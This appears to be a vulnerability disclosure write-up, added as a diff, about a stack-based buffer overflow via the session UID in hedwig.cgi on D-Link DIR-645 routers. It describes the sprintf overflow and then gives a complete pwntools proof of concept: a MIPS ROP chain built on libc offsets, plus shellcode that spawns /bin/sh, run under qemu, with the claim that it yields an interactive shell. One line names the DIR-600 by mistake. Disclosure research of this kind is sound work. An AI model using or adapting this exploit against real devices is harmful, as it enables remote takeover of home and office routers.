@@ -1,0 +1,92 @@
+# **A stack-based buffer overflow vulnerability exists in the hedwig.cgi of D-Link DIR-645**
+
+## **Vulnerability Summary**
+
+Vendor: D-Link
+Product: D-Link DIR-645
+Affected Component: `hedwig.cgi`
+Affected Version: Firmware versions ≤ v1.03
+Vulnerability Type: Stack-based Buffer Overflow
+Impact: Remote Code Execution
+
+# Vulnerability Description
+
+The D-Link DIR-600 is a wireless router designed for home and small office environments, and it is still deployed in some actual network scenarios. 
+
+In early firmware versions of the D-Link DIR-645 router (such as v1.01–v1.03), the core function `hedwigcgi_main` of `/cgi-bin/hedwig.cgi` has a stack-based buffer overflow vulnerability.
+
+When processing HTTP requests, the program retrieves the user session identifier (Session UID), which can be indirectly controlled by client requests. Then, it uses `sprintf` to concatenate it into a fixed-size stack buffer without performing length checks.
+
+If an attacker constructs overly long input, it can cause a stack buffer overflow, overwriting registers and the return address ($ra) on the stack, thereby hijacking the program's execution flow. By carefully crafting the data, an attacker can achieve remote code execution (RCE) and ultimately gain full control of the device.
+
+## Vulnerability Details
+
+![19cc5a7e01cff15e0baeb14701efee39](F:\日常\xwechat_files\wxid_gpub4un7w3k622_db03\temp\RWTemp\2026-03\9e20f478899dc29eb19741386f9343c8\19cc5a7e01cff15e0baeb14701efee39.png)
+
+![8b17eb1d596ee6af98422e7b96086715](F:\日常\xwechat_files\wxid_gpub4un7w3k622_db03\temp\RWTemp\2026-03\9e20f478899dc29eb19741386f9343c8\8b17eb1d596ee6af98422e7b96086715.png)
+
+In the D-Link DIR-645 firmware, the core function `hedwigcgi_main` of `/cgi-bin/hedwig.cgi` contains a stack-based buffer overflow vulnerability.
+
+Decompiled results show that the function defines a fixed-size buffer on the stack.
+
+This buffer is used for subsequent string concatenation operations. During the function's execution, the program concatenates the user's session identifier (Session UID) into `v27`.
+
+Since `v27` is located on the stack and has a fixed size (1024 bytes), if an attacker crafts an excessively long UID input, it will cause an out-of-bounds write, overwriting adjacent stack structures.
+
+An attacker can exploit carefully crafted overflow data to control the return address, causing the program to jump to the stack or other controllable memory areas, thereby enabling arbitrary code execution (RCE).
+
+## POC
+
+```
+from pwn import *
+context(os = 'linux', arch = 'mips', log_level = 'debug')
+ 
+libc_base = 0x7f738000 # 这里的libc_base每个人都是不一样的需要修改
+ 
+payload = b'a'*0x3cd
+payload += b'a'*4
+payload += p32(libc_base + 0x436D0) # s1  move $t9, $s3 (=> lw... => jalr $t9)
+payload += b'a'*4
+payload += p32(libc_base + 0x56BD0) # s3  sleep
+payload += b'a'*(4*5)
+payload += p32(libc_base + 0x57E50) # ra  li $a0, 1 (=> jalr $s1)
+ 
+payload += b'a'*0x18
+payload += b'a'*(4*4)
+payload += p32(libc_base + 0x37E6C) # s4  move  $t9, $a1 (=> jalr $t9)
+payload += p32(libc_base + 0x3B974) # ra  addiu $a1, $sp, 0x18 (=> jalr $s4)
+ 
+shellcode = asm('''
+	slti $a2, $zero, -1
+	li $t7, 0x69622f2f
+	sw $t7, -12($sp)
+	li $t6, 0x68732f6e
+	sw $t6, -8($sp)
+	sw $zero, -4($sp)
+	la $a0, -12($sp)
+	slti $a1, $zero, -1
+	li $v0, 4011
+	syscall 0x40404
+''')
+payload += b'a'*0x18
+payload += shellcode
+ 
+payload = b"uid=" + payload
+post_content = "Pers1st=Pwner"
+io = process(b"""
+    qemu-mipsel -g 1234  -L ./ \
+    -0 "hedwig.cgi" \
+    -E REQUEST_METHOD="POST" \
+    -E CONTENT_LENGTH=11 \
+    -E CONTENT_TYPE="application/x-www-form-urlencoded" \
+    -E HTTP_COOKIE=\"""" + payload + b"""\" \
+    -E REQUEST_URI="2333" \
+    ./htdocs/cgibin
+""", shell = True)
+io.send(post_content)
+io.interactive()
+```
+
+The shellcode is successfully executed, resulting in an interactive shell:
+
+![image-20260325175613843](C:\Users\陈俊伟\AppData\Roaming\Typora\typora-user-images\image-20260325175613843.png)
